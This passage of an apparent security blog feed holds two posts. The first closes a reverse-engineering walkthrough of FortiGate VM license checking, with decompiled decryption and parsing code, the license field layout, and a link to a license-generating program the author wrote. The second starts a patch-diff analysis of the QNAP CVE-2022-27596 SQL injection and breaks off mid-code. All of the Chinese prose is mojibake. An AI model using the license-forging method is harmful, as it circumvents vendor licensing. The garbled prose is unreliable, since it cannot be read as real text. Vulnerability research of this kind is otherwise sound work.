( !v20 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">-1</span>;</span><br><span class="line">                    RSA_free(v18);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">                  &#125;</span><br><span class="line">                  ptr = v20;</span><br><span class="line">                  v21 = RSA_public_decrypt(v12, v14, v20, v18, <span class="number">1LL</span>);<span class="comment">// RSA å…¬é’¥è§£å¯†</span></span><br><span class="line">                  RSA_free(v18);</span><br><span class="line">                  <span class="keyword">if</span> ( v21 &gt; <span class="number">31</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">0</span>;</span><br><span class="line">                    aes_key = _mm_loadu_si128(ptr);</span><br><span class="line">                    v41 = _mm_loadu_si128(ptr + <span class="number">1</span>);</span><br><span class="line">                    <span class="built_in">free</span>(ptr);</span><br><span class="line">LABEL_22:</span><br><span class="line">                    aes_decrypted_1 = AES_DEC(aes_enc_data, enc_data_length, &amp;aes_key, &amp;aes_key);<span class="comment">// AES è§£å¯†éƒ¨åˆ†</span></span><br><span class="line">                    <span class="keyword">if</span> ( *(aes_decrypted_1 + <span class="number">1</span>) == <span class="number">0x13A38693</span> )<span class="comment">// è§£å¯†ä¹‹å check magic</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v24 = aes_decrypted_1[enc_data_length - <span class="number">1</span>];</span><br><span class="line">                      data_start = aes_decrypted_1 + <span class="number">12</span>;<span class="comment">// è¶Šè¿‡ å‰ 12 å­—èŠ‚</span></span><br><span class="line">                      <span class="keyword">if</span> ( v24 &lt; <span class="number">0x10</span>u )</span><br><span class="line">                        enc_data_length -= v24;</span><br><span class="line">                      v26 = &amp;aes_decrypted_1[enc_data_length];</span><br><span class="line">                      <span class="keyword">if</span> ( data_start &gt;= v26 )</span><br><span class="line">                      &#123;</span><br><span class="line">final_check:</span><br><span class="line">                        <span class="keyword">if</span> ( v22 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          LOBYTE(lic_struct-&gt;unknow9) = <span class="number">1</span>;</span><br><span class="line">                          v34 = <span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVMEV&quot;</span>, <span class="number">6uLL</span>) == <span class="number">0</span>;</span><br><span class="line">                          v22 = !v34;</span><br><span class="line">                          <span class="keyword">if</span> ( !v34 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            v34 = <span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVM--UNLICENSED&quot;</span>, <span class="number">0x10</span>uLL) == <span class="number">0</span>;</span><br><span class="line">                            v22 = !v34;</span><br><span class="line">                            <span class="keyword">if</span> ( !v34 )</span><br><span class="line">                              v22 = -(<span class="built_in">memcmp</span>(lic_struct-&gt;SERIALNO, <span class="string">&quot;FGVMPG&quot;</span>, <span class="number">6uLL</span>) != <span class="number">0</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          LOBYTE(lic_struct-&gt;unknow9) = <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">while</span> ( <span class="number">1</span> )               <span class="comment">// ä¸»è¦è§£æé€»è¾‘</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        key_name_length = *data_start;</span><br><span class="line">                        v28 = data_start + <span class="number">1</span>;</span><br><span class="line">                        v29 = &amp;data_start[key_name_length + <span class="number">1</span>];</span><br><span class="line">                        key_value_length = *(v29 + <span class="number">1</span>);</span><br><span class="line">                        key_value = (v29 + <span class="number">3</span>);</span><br><span class="line">                        key_flag = *v29;</span><br><span class="line">                        v39 = <span class="number">0</span>;</span><br><span class="line">                        data_start = &amp;v29[key_value_length + <span class="number">3</span>];<span class="comment">// åˆ†æ®µæ•°æ®</span></span><br><span class="line">                        <span class="keyword">if</span> ( key_name_length &lt; <span class="number">8</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="keyword">if</span> ( (key_name_length &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            *key_name = *v28;</span><br><span class="line">                            *&amp;key_name[key_name_length - <span class="number">4</span>] = *(v28 + key_name_length - <span class="number">4</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span> ( key_name_length )</span><br><span class="line">                          &#123;</span><br><span class="line">                            key_name[<span class="number">0</span>] = *v28;</span><br><span class="line">                            <span class="keyword">if</span> ( (key_name_length &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">                              *&amp;key_name[key_name_length - <span class="number">2</span>] = *(v28 + key_name_length - <span class="number">2</span>);</span><br><span class="line">                          &#125;</span><br><span class="line">                          key_name[key_name_length] = <span class="number">0</span>;</span><br><span class="line">                          <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">                            <span class="keyword">if</span> ( key_value_length != <span class="number">4</span> )</span><br><span class="line">                              <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">                            key_value = &amp;v39;</span><br><span class="line">                            v39 = _byteswap_ulong(*(v29 + <span class="number">3</span>));</span><br><span class="line">fillin_struct:</span><br><span class="line">                            fillin_struct_func(lic_struct, key_name, key_flag, key_value, key_value_length);<span class="comment">// å¡«å…… lic_struct ç»“æ„ä½“</span></span><br><span class="line">                            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          *&amp;key_name[key_name_length - <span class="number">8</span>] = *(v28 + key_name_length - <span class="number">8</span>);</span><br><span class="line">                          qmemcpy(key_name, v28, <span class="number">8</span> * ((key_name_length - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">                          key_name[key_name_length] = <span class="number">0</span>;</span><br><span class="line">                          <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">                            <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( key_flag == <span class="string">&#x27;s&#x27;</span> )</span><br><span class="line">                          <span class="keyword">goto</span> fillin_struct;</span><br><span class="line">LABEL_34:</span><br><span class="line">                        <span class="keyword">if</span> ( v26 &lt;= data_start )</span><br><span class="line">                          <span class="keyword">goto</span> final_check;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> failed;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="built_in">free</span>(ptr);</span><br><span class="line">                  <span class="keyword">if</span> ( v12 == <span class="number">32</span> )              <span class="comment">// key_length == 32</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v22 = <span class="number">1</span>;</span><br><span class="line">                    aes_key = _mm_loadu_si128((decode_content_1 + <span class="number">4</span>));<span class="comment">// RSA è§£å¯†å¤±è´¥çš„è¯èµ°è¿™é‡Œ</span></span><br><span class="line">                    v41 = _mm_loadu_si128((decode_content_1 + <span class="number">20</span>));</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">failed:</span><br><span class="line">                v22 = <span class="number">-1</span>;</span><br><span class="line">LABEL_47:</span><br><span class="line">                <span class="built_in">free</span>(decode_content_1);</span><br><span class="line">                EVP_PKEY_free(v37);</span><br><span class="line">                <span class="keyword">return</span> v22;</span><br><span class="line">              &#125;</span><br><span class="line">              *lic_end_1 = <span class="number">45</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘é‡å‘½åäº†ä¸€äº›å˜é‡å¹¶æ·»åŠ äº†ä¸€éƒ¨åˆ†æ³¨é‡Šï¼Œè¿™ä¸ªå‡½æ•°é€»è¾‘ç¨ç¨å¤æ‚ï¼Œç®€è¦æè¿°å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆæ£€æŸ¥æˆæƒæ–‡ä»¶æ˜¯å¦åŒ…å«å®šä½ç¬¦ï¼Œæ ¹æ®å®šä½ç¬¦ç¡®å®šä¸»è¦å†…å®¹çš„èµ·æ­¢ä½ç½®ï¼Œå¯¹å†…å®¹è¿›è¡Œ Base64 è§£ç ï¼Œç„¶åä»è§£ç çš„æ•°æ®ä¸­è¯»å–å¤´éƒ¨ç»“æ„ã€‚ä»å†…å­˜ä¸­è§£å‹ä¸€ä¸ª RSA å…¬é’¥ï¼Œå…ˆå°è¯•ä½¿ç”¨è¿™ä¸ªå…¬é’¥è§£å¯†ä½™ä¸‹è¯·æ±‚ï¼Œå¦‚æœè§£å¯†å¤±è´¥ï¼Œå†å°è¯•ä½¿ç”¨ AES-128-CBC è§£å¯†å†…å®¹ï¼Œä½¿ç”¨çš„ key å’Œ iv æ˜¯ä» Base64 è§£ç çš„æ•°æ®å¤´éƒ¨è·å¾—çš„ã€‚</p>
<p>ä¹‹åå¯¹è§£å¯†çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œé¦–å…ˆæ˜¯ magic éƒ¨åˆ†éœ€è¦ç­‰äº 0x13A38693ï¼Œä¹‹åè·Ÿéšæ•°ä¸ª Block ç»“æ„ï¼ŒBlock ç»“æ„ç±»ä¼¼ TLVï¼Œç”±æ•°æ®é•¿åº¦ã€æ•°æ®åã€æ•°æ®å€¼ç»„æˆï¼Œæ¯ä¸ª Block å¯¹åº” License ä¸­çš„ä¸€ä¸ªä¿¡æ¯å­—æ®µã€‚</p>
<p>è§£æå¥½å„ä¸ªç»“æ„ä¹‹åå°†è¿™äº›ä¿¡æ¯å¡«å……åˆ° lic_struct ç»“æ„ä½“ä¸­ï¼Œå¹¶åœ¨åç»­åŠŸèƒ½ç»§ç»­ä½¿ç”¨ã€‚</p>
<p>æ ¹æ®ä»¥ä¸Šä»£ç é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥æ•´ç†å‡º Licnese çš„å¤§è‡´ç»„æˆï¼Œä»¥ Python æ¥è¡¨ç¤º</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">License</span>:</span><br><span class="line">    aes_key_iv_length = <span class="number">32</span>            <span class="comment"># 4 bytes</span></span><br><span class="line">    aes_key = <span class="string">b&quot;\x61&quot;</span> * <span class="number">32</span>            <span class="comment"># 32 bytes, contains iv(16 bytes) and key(16 bytes)</span></span><br><span class="line">    enc_data_length = <span class="literal">None</span>            <span class="comment"># 4 bytes</span></span><br><span class="line">    enc_data = <span class="literal">None</span>                   <span class="comment"># length = enc_data_length</span></span><br><span class="line">    license_data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, licensedata</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LicenseDataBlock</span>:</span><br><span class="line">    key_name_length = <span class="literal">None</span>    <span class="comment"># 1 byte</span></span><br><span class="line">    key_name = <span class="literal">None</span></span><br><span class="line">    key_flag = <span class="literal">None</span>           <span class="comment"># 1 byte, &#x27;s&#x27; for str or &#x27;n&#x27; for num</span></span><br><span class="line">    key_value_length = <span class="literal">None</span>   <span class="comment"># 2 bytes</span></span><br><span class="line">    key_value = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, keyname, keyvalue</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>ç¨‹åºä¸­è¿˜å­˜åœ¨ä¸€ä¸ªå…³é”®ç»“æ„ä½“ï¼Œå®šä¹‰äº† Block åŸºæœ¬ä¿¡æ¯</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lic_block</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *key_name;</span><br><span class="line">  __int64 key_flag;</span><br><span class="line">  __int64 offset_in_lic_struct;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">lic_block lic_block_array[<span class="number">12</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="string">&quot;SERIALNO&quot;</span>, <span class="number">115LL</span>, <span class="number">0LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CERT&quot;</span>, <span class="number">115LL</span>, <span class="number">8LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;KEY&quot;</span>, <span class="number">115LL</span>, <span class="number">16LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CERT2&quot;</span>, <span class="number">115LL</span>, <span class="number">24LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;KEY2&quot;</span>, <span class="number">115LL</span>, <span class="number">32LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CREATEDATE&quot;</span>, <span class="number">115LL</span>, <span class="number">40LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;UUID&quot;</span>, <span class="number">115LL</span>, <span class="number">48LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CONTRACT&quot;</span>, <span class="number">115LL</span>, <span class="number">56LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;USGFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">64LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;LENCFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">68LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;CARRIERFACTORY&quot;</span>, <span class="number">110LL</span>, <span class="number">72LL</span> &#125;,</span><br><span class="line">  &#123; <span class="string">&quot;EXPIRY&quot;</span>, <span class="number">110LL</span>, <span class="number">76LL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>è‡³æ­¤æˆ‘ä»¬å·²ç»å¾—çŸ¥äº† License çš„ç»“æ„å’Œç»„æˆæˆåˆ†ï¼Œæ¥ä¸‹æ¥éœ€è¦åˆ†æ block ä¸­å„é¡¹éƒ½èµ·ä»€ä¹ˆä½œç”¨ï¼Œä»¥åŠ lic_struct ç»“æ„ä½“æ˜¯å¦‚ä½•å‚ä¸ License éªŒè¯çš„ã€‚ä¸è¿‡è¿™é‡Œæœ‰æ¯”è¾ƒç®€å•çš„æ–¹æ³•ï¼ŒBlock å…·æœ‰æ¯”è¾ƒæ¸…æ™°çš„åç§°ï¼Œæ ¹æ®åç§°å¯å¤§è‡´çŒœæµ‹å…¶ä½œç”¨ï¼Œä¾‹å¦‚ SERIALNO åº”è¯¥è¡¨ç¤ºè®¾å¤‡åºåˆ—å·ï¼ŒCREATEDATE è¡¨ç¤º license å¯¼å…¥æ—¥æœŸï¼ŒEXPIRY è¡¨ç¤ºè¿‡æœŸæ—¶é—´ç­‰ã€‚</p>
<p>é€šè¿‡è°ƒè¯•å¹¶ç»“åˆä»£ç åˆ†æï¼ŒBlock ä¸­å…¶å…³é”®ä½œç”¨çš„åº”è¯¥æ˜¯ SERIALNOã€CREATEDATEã€USGFACTORYã€LENCFACTORYã€CARRIERFACTORYã€EXPIRY å‡ ä¸ªå­—æ®µï¼Œå…¶ä½™å­—æ®µå¯ä»¥çœç•¥ã€‚</p>
<p>æ ¹æ®åˆ†æç»“æœï¼Œç¼–å†™å‡ºå¯¹åº”çš„æ³¨å†Œç¨‹åºï¼Œä½ å¯ä»¥åœ¨ <a class="link"   href="https://github.com/rrrrrrri/fgt-gadgets" >Github<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸Šè·å–ã€‚</p>
<p>å¯¼å…¥ç”Ÿæˆçš„ License æ–‡ä»¶åå†æ¬¡æ‰§è¡Œ <code>vm-print-license</code> å¾—åˆ° License åˆæ³•çš„ç»“æœï¼Œè€Œä¸”åå°åŠŸèƒ½ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_9.png"
                     
                ></p>
<p>æœ¬éƒ¨åˆ†ä»‹ç»äº† FortiGate License æˆæƒéªŒè¯é€»è¾‘ï¼Œåˆ†æäº† License ç»„æˆç»“æ„å’Œå„å­—æ®µå¤§è‡´å«ä¹‰ï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªæ³¨å†Œç¨‹åºå¯ä»¥ç”Ÿæˆåˆé€‚çš„ Licenseã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-27596</title>
    <url>/2023/02/06/CVE-2022-27596/</url>
    <content><![CDATA[<p>2023 å¹´ 1 æœˆ 30 æ—¥ï¼ŒQNAP å®˜æ–¹å…¬å¸ƒäº†å½±å“ QNAP NAS è®¾å¤‡çš„æ¼æ´ <a class="link"   href="https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01" >CVE-2022-27596<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´çš„æˆå› è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><p>æœ¬æ¬¡å¤ç°æˆ‘ä»¬ä½¿ç”¨è®¾å¤‡ TS-532Xï¼Œè¿™æ˜¯ä¸€æ¬¾å…·æœ‰ 5 ä¸ªç£ç›˜æ’æ§½çš„æ¡Œé¢ NAS è®¾å¤‡ï¼Œæ”¯æŒ QTS 5.0.1 ç³»ç»Ÿã€‚</p>
<p>å­˜åœ¨æ¼æ´çš„ç›¸å…³ç¨‹åºæˆ‘å·²ç»ä¸Šä¼ è‡³<a class="link"   href="https://pan.baidu.com/s/1yQv7SQTrDP9A9nYx_FIDtg" >ç½‘ç›˜<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œæå–ç ï¼š4rn6ã€‚æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥ä¸‹è½½åˆ†æã€‚</p>
<h3 id="è¡¥ä¸å¯¹æ¯”"><a href="#è¡¥ä¸å¯¹æ¯”" class="headerlink" title="è¡¥ä¸å¯¹æ¯”"></a>è¡¥ä¸å¯¹æ¯”</h3><p>å®˜æ–¹é€šå‘Šä¸­åªç®€å•æè¿°äº†æ¼æ´å±å®³ï¼Œæ ¹æ® json é™„ä»¶å’Œç¬¬ä¸‰æ–¹ä¿¡æ¯å¯ä»¥å¤§ä½“ç¡®å®šï¼Œè¿™æ˜¯ä¸€ä¸ª SQL æ³¨å…¥æ¼æ´ã€‚</p>
<p>é¦–å…ˆä¸‹è½½åˆ°ä¸¤ä¸ªä¸´ç•Œç‰ˆæœ¬(QTS 5.0.1.2194 build 20221022 å’Œ QTS 5.0.1.2234 build 20221201)ï¼Œè§£å‹åæ¯”å¯¹æ–‡ä»¶ç³»ç»Ÿï¼Œweb ç›®å½•ä¸‹å‘ç”Ÿå˜åŒ–çš„ç¨‹åºä¸æ˜¯å¾ˆå¤šï¼Œé‰´äºè¯¥æ¼æ´æ— éœ€æˆæƒå³å¯åˆ©ç”¨ï¼Œæ’é™¤æ‰ä¸€äº›åå°æ¥å£ä¹‹åï¼Œå¯ä»¥å‘ç° authLogin.cgi æ¯”è¾ƒå¯ç–‘ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-1.png"
                     
                ></p>
<p>ä½¿ç”¨ Bindiff æ¯”è¾ƒä¸¤ä¸ªç‰ˆæœ¬ç¨‹åº</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-2.png"
                     
                ></p>
<p>å‘ç”Ÿå˜åŒ–çš„ä»…æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°å®é™…é€»è¾‘æ²¡æœ‰å˜åŒ–ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ç¬¬äºŒä¸ªå‡½æ•°ã€‚</p>
<p>sub_408bb8 æ˜¯ authLogin.cgi çš„ä¸»è¦å¤„ç†å‡½æ•°ï¼Œé™äºç¯‡å¹…è¿™é‡Œä¸åˆ—å‡ºå®Œæ•´ä»£ç ã€‚ä¸¤ä¸ªç‰ˆæœ¬çš„å·®å¼‚ä¸»è¦åœ¨äºä¸€äº›å­—ç¬¦ä¸²å‘ç”Ÿäº†å˜åŒ–ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2194</span></span><br><span class="line"><span class="keyword">if</span> ( ((v39 + <span class="number">2</span>) &amp; <span class="number">0xFFFFFFFD</span>) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    sub_411B58(<span class="number">1LL</span>);</span><br><span class="line">    v55 = sub_40F730(<span class="string">&quot;SMBFW&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    v56 = sub_40CD08(v55);</span><br><span class="line">    sub_40CE20(v56);</span><br><span class="line">    v57 = Is_2SV_Enable(byte_43AB0A);</span><br><span class="line">    v58 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v57 )</span><br><span class="line">        v58 = Is_User_Group_Force_2SV_Effect(byte_43AB0A) != <span class="number">0</span>;</span><br><span class="line">    v40 = sub_41E000;</span><br><span class="line">    v41 = <span class="string">&quot;NVRVER&quot;</span>;</span><br><span class="line">    v43 = sub_41E000;</span><br><span class="line">    v59 = sub_40F730(<span class="string">&quot;force_2sv&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v58);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_94;</span><br><span class="line">&#125;</span><br><span class="line">v41 = <span class="string">&quot;NVRVER&quot;</span>;</span><br><span class="line">v40 = sub_41E000;</span><br><span class="line">v44 = sub_411B58(<span class="number">0LL</span>);</span><br><span class="line">v43 = sub_41E000;</span><br><span class="line">LABEL_65:</span><br><span class="line">v45 = sub_40D038(v44);</span><br><span class="line">sub_40F730(<span class="string">&quot;ts&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%lld&quot;</span>, v45);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2234</span></span><br><span class="line"><span class="keyword">if</span> ( ((v39 + <span class="number">2</span>) &amp; <span class="number">0xFFFFFFFD</span>) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v43 = <span class="string">&quot;nagement&quot;</span>;</span><br><span class="line">    sub_411C30(<span class="number">1LL</span>);</span><br><span class="line">    v52 = sub_40F808(<span class="string">&quot;SMBFW&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    v53 = sub_40CDE0(v52);</span><br><span class="line">    sub_40CEF8(v53);</span><br><span class="line">    v54 = Is_2SV_Enable(byte_43ABEA);</span><br><span class="line">    v55 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v54 )</span><br><span class="line">        v55 = Is_User_Group_Force_2SV_Effect(byte_43ABEA) != <span class="number">0</span>;</span><br><span class="line">    v40 = sub_41E000;</span><br><span class="line">    v41 = <span class="string">&quot;qdownload&quot;</span>;</span><br><span class="line">    sub_40F808(<span class="string">&quot;force_2sv&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%d&quot;</span>, v55);</span><br><span class="line">    v56 = <span class="number">4317184LL</span>;</span><br><span class="line">    v215 = sub_41E000;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_95;</span><br><span class="line">&#125;</span><br><span class="line">v41 = <span class="string">&quot;qdownload&quot;</span>;</span><br><span class="line">v40 = sub_41E000;</span><br><span class="line">v43 = <span class="string">&quot;Share Management&quot;</span> + <span class="number">8</span>;</span><br><span class="line">sub_411C30(<span class="number">0LL</span>);</span><br><span class="line">v44 = <span class="number">4317184LL</span>;</span><br><span class="line">v215 = sub_41E000;</span><br><span class="line">LABEL_65:</span><br><span class="line">v45 = sub_40D110(v44);</span><br><span class="line">sub_40F808(<span class="string">&quot;ts&quot;</span>, <span class="number">0LL</span>, <span class="string">&quot;%lld&quot;</span>, v45);</span><br></pre></td></tr></table></figure></div>

<p>é™¤å­—ç¬¦ä¸²ä¹‹å¤–ä»£ç é€»è¾‘å˜åŒ–è¾ƒå°ï¼Œä¸”æ²¡æœ‰å‘ç° SQL ç›¸å…³æ“ä½œã€‚æˆ‘ä»¬çŒœæµ‹ä¸»è¦æ¼æ´å¯èƒ½ä½äº authLogin.cgi ä½¿ç”¨çš„ so åº“ä¸­ã€‚</p>
<p>å¯¹æ¯”ä¸¤ä¸ªç‰ˆæœ¬çš„ so åº“ç›®å½•ï¼Œæ‰¾åˆ°ä¸€äº›å­˜åœ¨å·®å¼‚çš„æ–‡ä»¶ï¼Œé€šè¿‡æœç´¢å‡½æ•°å¯ä»¥æ‰¾åˆ°å…³é”®æ–‡ä»¶ libuLinux_NAS.so.0.0ï¼ŒåŒæ ·ä½¿ç”¨ bindiff æ¯”è¾ƒï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-27596-3.png"
                     
                ></p>
<p>é€ä¸ªåˆ†æï¼Œæœ€ç»ˆæ‰¾åˆ°å…³é”®å‡½æ•° sub_63D58(2194 ç‰ˆæœ¬)ï¼Œåˆ—ä¸¾ä¸¤ä¸ªç‰ˆæœ¬ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2194</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_63D58</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3, _BYTE *a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 data, __int64 a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v38 = <span class="number">0LL</span>;</span><br><span class="line">  v37 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v32, <span class="number">0</span>, <span class="keyword">sizeof</span>(v32));</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt; <span class="number">-1</span> || a3 &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 &lt; <span class="number">0</span> || a6 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &amp;&amp; *a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        v38 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q DESC &quot;</span>, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v38 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v38 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q ASC &quot;</span>, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( data )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v10], <span class="string">&quot;AND client_id = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">24</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v11], <span class="string">&quot;AND token = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v12], <span 